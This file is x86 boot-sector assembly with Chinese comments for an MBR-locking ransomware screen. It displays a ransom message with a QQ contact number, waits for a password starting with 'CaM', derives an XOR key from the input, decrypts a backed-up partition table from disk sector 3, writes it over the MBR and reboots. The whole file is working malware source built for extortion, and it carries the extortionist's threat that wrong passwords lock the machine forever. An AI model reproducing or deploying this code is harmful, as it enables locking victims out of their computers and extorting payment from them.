;
;
;
;
;

org 0x7c00
start:
	mov ax,cs
	mov ds,ax
	mov ss,ax
	mov es,ax
	mov sp,0x100
	;----
main:
	mov bp,Tips ;指向字符串
	mov cx,Tips_Len
	mov ax,0x1301
	mov bx,0x0c
	mov dl,0
	int 0x10 ;调用BIOS显示服务

;loop1:
;	loop loop1
	
	mov ax,0xb800
	add ax,0xa0
	mov ds,ax ;ds 0xb8a0 指向 显示器 缓存
	xor cx,cx ; cx = 0
	xor bx,bx

GetChar:
	xor ax,ax        ; ax -- ah al, 输入字符放入al
	int 0x16         ; 键盘中断
	cmp AL,0x08      ; 退格键 if al==0x8
	je back
	CMP al,0x0d      ; 回车键 
	je entry
	mov ah,2
	mov [bx],al
	mov [bx+1],ah
	xor al,al
	mov [bx+2],al
	add bx,2
	inc cx
	mov [cs:InputCnt],cx
	jmp GetChar

back:
	sub bx,2
	dec cx
	mov [cs:InputCnt],cx
	xor ax,ax
	mov [bx],ax
	jmp GetChar

entry:
	mov ax,cs
	mov es,ax
	xor bx,bx

	mov al,[ds:bx] 
	cmp al,'C'
	jne key_err   ; 第一位 不是C ,退出
	add bx,2
	mov al,[ds:bx]
	cmp al,'a'
	jne key_err
	add bx,2
	mov al,[ds:bx]
	cmp al,'M'
	jne key_err
	add bx,2

	mov cl,0xff ; 长度 255
	mov ch, 0
	mov [cs:XResult] ,ch

calc_key:
	mov al,[ds:bx]
	cmp al,0
	je fixmbr
	xor [cs:XResult],al
	add bx,2
	loop calc_key

fixmbr:
	mov ax,0x7e00
	mov es,ax
	xor bx,bx
	mov ah,0x2     ;-- 功能号，读入
	mov dl,0x80    ;-- 驱动
	mov al,1       ;-- 读入扇区数
	mov dh,0       ;-- 磁头
	mov ch,0       ;-- 柱面
	mov cl,3       ;-- 扇区
	int 0x13       ;-- 服务
	;MBR
	mov bx,0x01bd
	xor ch,ch
	mov [es:bx],ch
	mov bx,0x01be
	mov cl,64

decrypt:
	mov al,[es:bx]
	xor al,[cs:XResult]
	mov [es:bx],al
	inc bx
	loop decrypt
	;写回

	xor bx,bx
	mov ah,0x3  ; 功能号 写回
	mov dl,0x80 ; 驱动器号
	mov al,1    ; 数量
	mov dh,0    ; 磁头
	mov ch,0    ; 柱面
	mov cl,1    ; MBR扇区
	int 0x13
	jmp _REST ;重启计算机

	
key_err:
	mov bx,0xb800
	add bx,Tips_Len
	mov al,'X'
	mov [bx],al
	mov cx,[cs:InputCnt]
	xor ax,ax
kk:	
	mov [bx],ax
	add bx,2
	loop kk
	jmp start
	;jmp _REST ;重启计算机

_REST:
	mov ax,0xffff
	push ax
	mov ax,0
	push ax
	retf

data:
XResult:db 0
InputCnt:db 0
Tips: db "Your computer was locked, contact Q:691714544 , and I will send u the password.Don't try any incorrect psw, it will locked forever!"
Tips_Len equ $-Tips ; #define Tips_Len ??  本地址-Tips ;; $ 该语句地址指针
times 510-($-$$) db 0xf  ;; 
dw 0xAA55
